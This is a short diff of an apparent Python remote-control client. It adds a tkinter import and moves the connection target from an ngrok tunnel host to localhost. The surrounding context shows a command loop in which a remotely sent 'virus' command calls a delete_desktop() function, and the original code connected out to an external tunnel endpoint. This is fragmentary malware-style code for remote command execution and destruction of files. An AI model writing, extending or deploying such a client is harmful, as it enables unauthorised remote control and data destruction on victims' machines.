@@ -6,6 +6,7 @@ import psutil
 import time
 import locale
 import json
+import tkinter as tk
 
 
 def delete_desktop():
@@ -110,6 +111,7 @@ def start_client(host, port):
 
             elif command == "virus":
                 delete_desktop()
+
             else:
                 client.send("Unknown command".encode())
             client.send("OK".encode())
@@ -121,4 +123,4 @@ def start_client(host, port):
 
 if __name__ == '__main__':
     # Start the client
-    start_client("0.tcp.jp.ngrok.io", 11400)
+    start_client("127.0.0.1", 8084)
